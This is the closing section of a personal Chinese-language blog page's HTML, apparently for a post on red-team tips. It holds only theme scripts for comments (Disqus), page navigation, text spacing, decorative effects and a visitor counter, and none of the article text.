href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://pizz33.github.io/posts/5a4172515764/'
+    this.page.identifier = 'posts/5a4172515764/'
+    this.page.title = '红队技术-攻防实战小技巧'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://pizz33.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Disqus' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<code>.*?<\/code>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    fetch('https://disqus.com/api/3.0/forums/listPosts.json?forum=pizz33&related=thread&limit=6&api_key=')
+      .then(response => response.json())
+      .then(data => {
+        const disqusArray = data.response.map(item => {
+          return {
+            'avatar': item.author.avatar.cache,
+            'content': changeContent(item.message),
+            'nick': item.author.name,
+            'url': item.url,
+            'date': item.createdAt
+          }
+        })
+
+        saveToLocal.set('disqus-newest-comments', JSON.stringify(disqusArray), 10/(60*24))
+        generateHtml(disqusArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      })
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick}</span><time> / ${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('disqus-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
